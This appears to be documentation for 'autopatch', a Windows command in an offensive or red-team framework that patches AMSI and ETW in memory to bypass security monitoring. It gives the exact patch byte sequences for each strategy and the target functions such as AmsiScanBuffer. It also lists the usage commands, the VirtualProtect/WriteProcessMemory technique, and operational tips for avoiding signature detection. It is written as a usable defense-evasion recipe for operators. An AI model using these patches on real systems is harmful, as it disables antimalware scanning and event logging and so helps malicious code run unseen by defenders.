+++
title = "autopatch"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Windows Only
{{% /notice %}}

## Summary

Patch security hooks in memory to bypass AMSI, ETW, and other monitoring. Supports pattern-based scanning to validate targets before patching, with multiple patch strategies.

**New in v2:** `scan` action checks targets without modifying memory. Pattern-based validation verifies function prologues match known Windows versions before patching.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | — | `scan`, `patch-amsi`, `patch-etw`, `patch-all` |
| strategy | No | xor-ret | Patch method: `xor-ret`, `ret`, `nop-ret`, `mov-ret` |
| dll_name | Legacy | — | DLL name for manual patching |
| function_name | Legacy | — | Function name for manual patching |
| num_bytes | Legacy | 300 | Scan range for legacy mode |

### Patch Strategies

| Strategy | Bytes | Description |
|----------|-------|-------------|
| xor-ret | `31 C0 C3` | `xor eax,eax; ret` — returns 0/S_OK (recommended) |
| ret | `C3` | Immediate return (undefined return value) |
| nop-ret | `90 90 C3` | `nop; nop; ret` — avoids single-byte signatures |
| mov-ret | `B8 01 00 00 00 C3` | `mov eax,1; ret` — returns TRUE |

## Usage

```
# Scan AMSI/ETW targets (read-only, no modification)
autopatch -action scan

# Patch AMSI with default strategy (xor-ret → returns S_OK)
autopatch -action patch-amsi

# Patch ETW with specific strategy
autopatch -action patch-etw -strategy ret

# Patch all known targets
autopatch -action patch-all

# Legacy mode: raw function patch
autopatch -dll_name amsi -function_name AmsiScanBuffer -num_bytes 300
```

## Scan Output Example

```json
[
  {
    "dll": "amsi.dll",
    "function": "AmsiScanBuffer",
    "address": "0x7fff12345678",
    "loaded": true,
    "found": true,
    "prologue_match": true,
    "already_patched": false,
    "current_bytes": "4C8BDC4989...",
    "matched_pattern": "4C8BDC",
    "patchable": true,
    "default_strategy": "xor-ret"
  }
]
```

## Operational Notes

- `scan` is read-only — safe for reconnaissance before committing to a patch
- `xor-ret` is preferred for AMSI/ETW because it returns 0/S_OK, indicating "clean" to callers
- Pattern validation checks function prologues against known Windows versions (10 20H2+, 1903)
- If prologue doesn't match known patterns, a warning is shown but patching proceeds
- Already-patched functions are detected and reported without double-patching
- Uses VirtualProtect → WriteProcessMemory → VirtualProtect (restores original protection)
- Pair with `ntdll-unhook` to remove inline hooks from ntdll

## MITRE ATT&CK Mapping

- **T1562.001** — Impair Defenses: Disable or Modify Tools
